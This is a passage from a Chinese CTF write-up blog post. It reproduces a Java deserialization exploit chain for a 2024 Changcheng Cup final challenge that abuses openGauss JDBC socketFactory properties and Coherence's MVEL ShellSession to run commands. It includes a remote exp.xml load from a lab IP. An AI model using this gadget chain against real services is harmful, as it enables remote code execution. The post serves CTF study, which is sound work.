@@ -1,0 +1,986 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/92be8204c485c8f6383d7346a7c613f8.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="2024长城杯暨京津冀网络安全竞赛决赛打完比赛后一直想复现这两道题，但是我自己做不出来 在前几天打一个比赛，在查资料时偶然发现了别人的做法 现在学习一下进行复现 openGauss环境jdk17，不出网 &lt;dependencies&gt;         &lt;dependency&gt;             &lt;groupId&gt;org.springframework.boo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="学习ccb决赛的0解java题">
+<meta property="og:url" content="https://zer0peach.github.io/2025/01/11/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="2024长城杯暨京津冀网络安全竞赛决赛打完比赛后一直想复现这两道题，但是我自己做不出来 在前几天打一个比赛，在查资料时偶然发现了别人的做法 现在学习一下进行复现 openGauss环境jdk17，不出网 &lt;dependencies&gt;         &lt;dependency&gt;             &lt;groupId&gt;org.springframework.boo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111181245521.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111180621149.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111180653257.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111220124452.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111220101988.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111220308642.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111220822201.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111220714910.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111220415949.png">
+<meta property="article:published_time" content="2025-01-11T06:37:28.000Z">
+<meta property="article:modified_time" content="2025-01-11T15:31:15.521Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/%E5%AD%A6%E4%B9%A0ccb%E5%86%B3%E8%B5%9B%E7%9A%840%E8%A7%A3java%E9%A2%98/image-20250111181245521.png">
+  
+  
+  
+  <title>学习ccb决赛的0解java题 - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="学习ccb决赛的0解java题"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-01-11 14:37" pubdate>
+          2025年1月11日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          100 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">学习ccb决赛的0解java题</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="2024长城杯暨京津冀网络安全竞赛决赛"><a href="#2024长城杯暨京津冀网络安全竞赛决赛" class="headerlink" title="2024长城杯暨京津冀网络安全竞赛决赛"></a>2024长城杯暨京津冀网络安全竞赛决赛</h1><p>打完比赛后一直想复现这两道题，但是我自己做不出来</p>
+<p>在前几天打一个比赛，在查资料时偶然发现了别人的做法</p>
+<p>现在学习一下进行复现</p>
+<h2 id="openGauss"><a href="#openGauss" class="headerlink" title="openGauss"></a>openGauss</h2><p>环境jdk17，不出网</p>
+<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.opengauss<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>opengauss-jdbc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.1-compatibility<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.oracle.coherence.ce<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>coherence-rest<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>14.1.1-0-3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba.fastjson2<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson2<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.37<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre></div>
+
+<p>入口就是Base64解密后反序列化</p>
+<p>经过数据库的学习，我们可以知道openGauss的jdbc连接类似postgresql</p>
+<p>并且给了文档</p>
+<p>所以我们可以用postgresql的jdbc利用方式</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">public static void main(String<span class="hljs-literal">[]</span> args) throws Exception
+&#123;
+    String className = <span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>;
+    String myargs = <span class="hljs-string">&quot;http://192.168.13.1:8000/exp.xml&quot;</span>;
+    Object dataSource = get<span class="hljs-constructor">DataSource(<span class="hljs-params">className</span>, <span class="hljs-params">myargs</span>)</span>;
+&#125;
+public static Object get<span class="hljs-constructor">DataSource(String <span class="hljs-params">className</span>, String <span class="hljs-params">myargs</span>)</span> throws Exception
+&#123;
+    Properties properties = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Properties()</span>;
+    properties.set<span class="hljs-constructor">Property(<span class="hljs-string">&quot;socketFactory&quot;</span>, <span class="hljs-params">className</span>)</span>;
+    properties.set<span class="hljs-constructor">Property(<span class="hljs-string">&quot;socketFactoryArg&quot;</span>, <span class="hljs-params">myargs</span>)</span>;
+
+    PGSimpleDataSource dataSource = <span class="hljs-keyword">new</span> <span class="hljs-constructor">PGSimpleDataSource()</span>;
+    set<span class="hljs-constructor">FieldValue(<span class="hljs-params">dataSource</span>, <span class="hljs-string">&quot;properties&quot;</span>, <span class="hljs-params">properties</span>)</span>;
+    dataSource.set<span class="hljs-constructor">User(<span class="hljs-string">&quot;test&quot;</span>)</span>;
+    dataSource.set<span class="hljs-constructor">Password(<span class="hljs-string">&quot;test&quot;</span>)</span>;
+    dataSource.set<span class="hljs-constructor">ServerName(<span class="hljs-string">&quot;localhost&quot;</span>)</span>;
+    dataSource.set<span class="hljs-constructor">PortNumber(5432)</span>;
+    dataSource.set<span class="hljs-constructor">DatabaseName(<span class="hljs-string">&quot;test&quot;</span>)</span>;
+    return dataSource;
+&#125;</code></pre></div>
+
+<p>toString可以用 EventListenerList 或者 Xstring</p>
+<p>调用getter可以用jackson的pojonode或fastjson2的jsonArray</p>
+<p>由于不出网，要另外找一个任意类实例化的利用</p>
+<p>大佬找出了是在<code>coherence-rest</code>依赖中的<code>ShellSession</code></p>
+<div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">ShellSession </span><span class="hljs-keyword">shellSession </span>= new <span class="hljs-keyword">ShellSession(&quot;new </span><span class="hljs-keyword">java.lang.ProcessBuilder(new </span><span class="hljs-keyword">java.lang.String[]&#123;\&quot;calc\&quot;&#125;).start()&quot;);</span></code></pre></div>
+
+<p>大概原理是通过mvel执行</p>
+<p>于是拼接起来</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">import com.fasterxml.jackson.databind.node.BaseJsonNode;
+import com.fasterxml.jackson.databind.node.POJONode;
+import com.tangosol.coherence.mvel2.sh.ShellSession;
+import javassist.*;
+import org.opengauss.ds.PGSimpleDataSource;
+import org.springframework.aop.framework.AdvisedSupport;
+import org.springframework.cglib.core.ReflectUtils;
+
+import javax.sql.DataSource;
+import javax.swing.event.EventListenerList;
+import javax.swing.undo.UndoManager;
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+import java.util.Properties;
+import java.util.Vector;
+
+public <span class="hljs-keyword">class</span> test &#123;
+    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;
+
+        String className = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ShellSession</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>;
+        String myargs = <span class="hljs-string">&quot;new java.lang.ProcessBuilder(new java.lang.String[]&#123;\&quot;calc\&quot;&#125;).start();&quot;</span>;
+
+        Object dataSource = get<span class="hljs-constructor">DataSource(<span class="hljs-params">className</span>, <span class="hljs-params">myargs</span>)</span>;
+
+        Class&lt;?&gt; clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>)</span>;
+        Constructor&lt;?&gt; cons = clazz.get<span class="hljs-constructor">DeclaredConstructor(AdvisedSupport.<span class="hljs-params">class</span>)</span>;
+        cons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        AdvisedSupport advisedSupport = <span class="hljs-keyword">new</span> <span class="hljs-constructor">AdvisedSupport()</span>;
+        advisedSupport.set<span class="hljs-constructor">Target(<span class="hljs-params">dataSource</span>)</span>;
+        InvocationHandler handler = (InvocationHandler) cons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">advisedSupport</span>)</span>;
+        Object proxyObj = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(<span class="hljs-params">clazz</span>.<span class="hljs-params">getClassLoader</span>()</span>, <span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DataSource</span>.</span></span><span class="hljs-keyword">class</span>&#125;, handler);
+        POJONode jsonNodes = <span class="hljs-keyword">new</span> <span class="hljs-constructor">POJONode(<span class="hljs-params">proxyObj</span>)</span>;
+
+        EventListenerList <span class="hljs-built_in">list</span> = <span class="hljs-keyword">new</span> <span class="hljs-constructor">EventListenerList()</span>;
+        UndoManager manager = <span class="hljs-keyword">new</span> <span class="hljs-constructor">UndoManager()</span>;
+        Vector vector = (Vector) get<span class="hljs-constructor">FieldValue(<span class="hljs-params">manager</span>, <span class="hljs-string">&quot;edits&quot;</span>)</span>;
+        vector.add(jsonNodes);
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">list</span>, <span class="hljs-string">&quot;listenerList&quot;</span>, <span class="hljs-params">new</span> Object[]&#123;InternalError.<span class="hljs-params">class</span>, <span class="hljs-params">manager</span>&#125;)</span>;
+        deserial(serial(<span class="hljs-built_in">list</span>));
+    &#125;
+    public static Object get<span class="hljs-constructor">DataSource(String <span class="hljs-params">className</span>, String <span class="hljs-params">myargs</span>)</span> throws Exception
+    &#123;
+        Properties properties = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Properties()</span>;
+        properties.set<span class="hljs-constructor">Property(<span class="hljs-string">&quot;socketFactory&quot;</span>, <span class="hljs-params">className</span>)</span>;
+        properties.set<span class="hljs-constructor">Property(<span class="hljs-string">&quot;socketFactoryArg&quot;</span>, <span class="hljs-params">myargs</span>)</span>;
+
+        PGSimpleDataSource dataSource = <span class="hljs-keyword">new</span> <span class="hljs-constructor">PGSimpleDataSource()</span>;
+        set<span class="hljs-constructor">FieldValue(<span class="hljs-params">dataSource</span>, <span class="hljs-string">&quot;properties&quot;</span>, <span class="hljs-params">properties</span>)</span>;
+        dataSource.set<span class="hljs-constructor">User(<span class="hljs-string">&quot;test&quot;</span>)</span>;
+        dataSource.set<span class="hljs-constructor">Password(<span class="hljs-string">&quot;test&quot;</span>)</span>;
+        dataSource.set<span class="hljs-constructor">ServerName(<span class="hljs-string">&quot;localhost&quot;</span>)</span>;
+        dataSource.set<span class="hljs-constructor">PortNumber(5432)</span>;
+        dataSource.set<span class="hljs-constructor">DatabaseName(<span class="hljs-string">&quot;test&quot;</span>)</span>;
+        return dataSource;
+
+    &#125;
+
+    public static Field get<span class="hljs-constructor">Field(<span class="hljs-params">final</span> Class&lt;?&gt; <span class="hljs-params">clazz</span>, <span class="hljs-params">final</span> String <span class="hljs-params">fieldName</span>)</span> &#123;
+        Field field = null;
+        <span class="hljs-keyword">try</span> &#123;
+            field = clazz.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">fieldName</span>)</span>;
+            field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        &#125; catch (NoSuchFieldException ex) &#123;
+            <span class="hljs-keyword">if</span> (clazz.get<span class="hljs-constructor">Superclass()</span> != null)
+                field = get<span class="hljs-constructor">Field(<span class="hljs-params">clazz</span>.<span class="hljs-params">getSuperclass</span>()</span>, fieldName);
+        &#125;
+        return field;
+    &#125;
+    public static Object get<span class="hljs-constructor">FieldValue(<span class="hljs-params">final</span> Object <span class="hljs-params">obj</span>, <span class="hljs-params">final</span> String <span class="hljs-params">fieldName</span>)</span> throws Exception &#123;
+        final Field field = get<span class="hljs-constructor">Field(<span class="hljs-params">obj</span>.<span class="hljs-params">getClass</span>()</span>, fieldName);
+        return field.get(obj);
+    &#125;
+    public static String serial(Object o) throws IOException, NoSuchFieldException &#123;
+        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayOutputStream()</span>;
+        ObjectOutputStream oos = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectOutputStream(<span class="hljs-params">baos</span>)</span>;
+        oos.write<span class="hljs-constructor">Object(<span class="hljs-params">o</span>)</span>;
+        oos.close<span class="hljs-literal">()</span>;
+
+        String base64String = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode<span class="hljs-constructor">ToString(<span class="hljs-params">baos</span>.<span class="hljs-params">toByteArray</span>()</span>);
+        return base64String;
+
+    &#125;
+
+    public static void deserial(String data) throws Exception &#123;
+        byte<span class="hljs-literal">[]</span> base64decodedBytes = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Decoder()</span>.decode(data);
+        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ByteArrayInputStream(<span class="hljs-params">base64decodedBytes</span>)</span>;
+        ObjectInputStream ois = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ObjectInputStream(<span class="hljs-params">bais</span>)</span>;
+        ois.read<span class="hljs-constructor">Object()</span>;
+        ois.close<span class="hljs-literal">()</span>;
+    &#125;
+
+    <span class="hljs-keyword">private</span> static void <span class="hljs-constructor">Base64Encode(ByteArrayOutputStream <span class="hljs-params">bs</span>)</span>&#123;
+        byte<span class="hljs-literal">[]</span> encode = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Base64</span>.</span></span>get<span class="hljs-constructor">Encoder()</span>.encode(bs.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>);
+        String s = <span class="hljs-keyword">new</span> <span class="hljs-constructor">String(<span class="hljs-params">encode</span>)</span>;
+        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(s);
+        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(s.length<span class="hljs-literal">()</span>);
+    &#125;
+    <span class="hljs-keyword">private</span> static void set<span class="hljs-constructor">FieldValue1(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">field</span>, Object <span class="hljs-params">arg</span>)</span> throws Exception&#123;
+        Field f = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">field</span>)</span>;
+        f.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        f.set(obj, arg);
+    &#125;
+    public static void set<span class="hljs-constructor">FieldValue(<span class="hljs-params">final</span> Object <span class="hljs-params">obj</span>, <span class="hljs-params">final</span> String <span class="hljs-params">fieldName</span>, <span class="hljs-params">final</span> Object <span class="hljs-params">value</span>)</span> throws Exception &#123;
+        final Field field = get<span class="hljs-constructor">Field(<span class="hljs-params">obj</span>.<span class="hljs-params">getClass</span>()</span>, fieldName);
+        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        <span class="hljs-keyword">if</span>(field != null) &#123;
+            field.set(obj, value);
+        &#125;
+    &#125;
+&#125;
+</code></pre></div>
+
+<p>但是我的见识浅薄</p>
+<p>不知道如何进行字节码加载</p>
+<p>我尝试了</p>
+<div class="code-wrapper"><pre><code class="hljs wren"><span class="hljs-title class_">String</span> <span class="hljs-variable">myargs</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.springframework.cglib.core.ReflectUtils.defineClass(<span class="hljs-char escape_">\&quot;</span>exp2<span class="hljs-char escape_">\&quot;</span>,java.util.Base64.getDecoder().decode(<span class="hljs-char escape_">\&quot;</span>yv66vgAAAD.....<span class="hljs-char escape_">\&quot;</span>), java.lang.ClassLoader.getSystemClassLoader());&quot;</span>;
+</code></pre></div>
+
+<p>但是会进行报错</p>
+<div class="code-wrapper"><pre><code class="hljs oxygene">[Error: unable <span class="hljs-keyword">to</span> invoke <span class="hljs-keyword">method</span>: defineClass]</code></pre></div>
+
+<p>此外也不知道了</p>
+<p>希望有大佬能教教</p>
+<h2 id="openrasp"><a href="#openrasp" class="headerlink" title="openrasp"></a>openrasp</h2><p>环境jdk8，不出网</p>
+<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-fileupload<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-fileupload<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
